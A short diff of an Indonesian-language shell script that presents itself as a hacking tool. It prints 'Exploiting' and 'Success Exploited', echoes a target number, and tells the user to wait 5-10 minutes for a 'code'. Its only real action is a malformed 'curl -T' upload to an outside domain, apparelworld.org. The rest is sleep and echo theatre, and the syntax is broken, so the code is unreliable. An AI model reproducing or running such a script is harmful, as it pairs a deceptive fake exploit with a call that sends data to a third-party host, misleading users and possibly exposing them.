@@ -42,7 +42,7 @@ echo "\033[34;1m [+]Sedang Scaning..."
 sleep 7
 echo "[+] Exploiting...";
 echo "Nomer => $nomer";
-curl -T http://apparelworld.org/
+curl -T  http://apparelworld.org/
 sleep 5;
 echo "[+] Done.";
 echo "Tunggu 5-10 Menit Untuk Mendapatkan Code.";
@@ -57,7 +57,7 @@ echo "Target => $target";
 sleep 0.5
 echo "[+] Sending Exploit...";
 echo "Code => $code" >> ;
-curl -T http://apparelworld.org/
+curl -T  http://apparelworld.org/
 sleep 5
 echo "[+] Success Exploited!";
 exit;
